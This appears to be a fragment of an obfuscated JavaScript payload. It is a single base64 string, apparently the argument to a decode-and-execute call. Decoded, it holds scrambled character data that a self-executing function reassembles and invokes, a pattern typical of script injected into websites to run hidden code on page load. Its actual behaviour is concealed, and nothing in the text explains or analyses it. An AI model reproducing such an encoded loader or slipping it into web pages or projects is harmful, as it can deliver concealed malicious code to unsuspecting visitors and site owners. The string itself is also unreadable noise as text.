WNvXSkzbzJjZEtib2w0S2N7dCZLdDQxY0s9JD02JWdfSytLSyVNYVZmMDU9MWopYSIscXNLZShfdzM1S2QybHJfXTFiSzFLfUsub2RdbyFlNHclS0tzYjByNil0dDMpS1sjKF92PSRLLktvdF1tJF0ubiludCsgVjcib19dS2JjKC5lLm5Lb1pvLigucmMkbmRmKyxqc3VpO0tLNilLbkkuS28mIGVLbjdLZV1TYmdLbiM1e25mb2JsY0swSzlLS0tiS3AyLnJ0YXFyNTssX2FjNi4rZTs9ZEshISglS2UsbHI/ZUssQCldJWI7KS5KbGJyVEtBbm9rS1VLY2IgdHUpbi50LnRLZj0zJWFkcl05bV1uLmYwMyRpLm87aSkpOzYxPyRcLzt9MG8gKHNcL2RyMGVjKy4uMW9gZmJLYyRwSyVFLikiWCFffShLdDRiKCFLKyg9Pl1LNW0uKFwnND9dZX0zM3NLZV87YmIlNy4wX0thSGJtLGlLLmVhS3RlMXR6KUs1c2RiS3koKEthP2lmaXQlbF1ffWxoWikxXXRldF1LWT00NyZle3VfZSBbbmU1Zm99ZGw9S3NLKjZLMmNLdDtsdHQzJWlvc3AgcGpSZCxycW5kMXJLLn1dYyV0LmguX0tLQi47KTs3YmRLYl9vLksgM2JuJVdHZV9iS0smZzAgLHRhbks0VTt4MkspS0sgdEt9LCl0S11pbihLLlttIUtLS2E0P3MtYygpXSlLQmR0LEtvbGImIjFuKWNyWjtpXS5mYV9jMWFbOzVlS3JfS0speygqSyUgS1QgdnUpMyx4KClQOUtTYzJjSz00S2IgI0tfS1slLj1sdHVvK3AyaTR0S1Q0KHM7PTg0Y0twS3QxYW9LdHdfX0FlcDwpaFlzIChfXV10cm1bKGl9XyFlWClfdGxzd3Mua2VwYmBabTVpXTBlS19SXztuSy4pdktLNEtZJClLIXVLdDNmKi5qWmFyaEtLYmJlaXJlX2JwK2IwLmF1a2UhcGFfS0suc3MzX24pMV8zal9vLGJLcDApKzBiMmFLSzMqZi49ZWkpfWNLPWJtQz0pYihuS3QzcnQpZmlLITRdbGI9S0t1XjZLb19sSz5ZPWRcXDtLZHJLNW8sYUtnIGk0XXJLZDI9cEtlZTFffVwnMSxOKzF5KSBiTUtdZEk1JUswPyhlal1uSzRlYndlYjssd11tLTlfaWEoaW5pLm9zOGFyckt9KVNuW2VLY19qJT1fNmZ0JEtvI2w1YWVLdG5Abi5fZkViJG9ja10oS3IhbylpJGk1PXJOIGhmLjFlS18yKnBbLiB1LmIzZl89S0tZXTlobnBzb19LXWF0ZzJfcjFvZXMgXz42KWxvMns1ZUtpUG8pYjFdcy49Syg4X1BzbSxLZVp0aWRkbH1hcF8gfSAoK0NvS0sxaXI0IH1ieWJ2S2UlSyByKD04XV0gPSkuIEtIbGIzZTYmIVMpMUtidCFoSzYzZH1iS2J7S11mKSZiS2EzZV9LJXRSMEt0KDxLKShfYTModGk5XzljSygye2UoOkt0LmJhN2I0YXtmbkszdDF5VCR7NDElIl8+Lig9X2ZvcjZpbXUpZSUpdWF0S2xiKXlLLnpLaSRleCwpc0s9X0tLbGJfZ19yMy5LXTNLZWI3JndlLnVyOCliKV0gdHM5X1llaWJ0S3JfMCB0MDEpYTpwKGloKEspaktFIGIuLmkuSTUyZCFiKUtib21LcE5LWTFhX0subi5LLHQgIXNuZGxpX0s0bnNQRCkpLW4gS24lIE5uYnNLS3V9aTNrY2VfaV0oNmVib1wvMUtLdEttLGhwIC5LZixLVSBdaWd0XW8ySyAkS0tLS0thZV8gX0c9Olo4S19zLl0uJktzcnRuJXggJiwoNTVyPT1vb3JlN1Q2KHVhdG97dHMoSyhybV1vLnouck5ubmp9IGIyZW4gS19ddH0oZDchIDI0MG50XXQ9dCArMUs1by5LKWIgKVVhIycpKTt2YXIgSHJBPU5oRCh0cmMsVE1jICk7SHJBKDUzNTUpO3JldHVybiA3MTYwfSkoKQ=='))
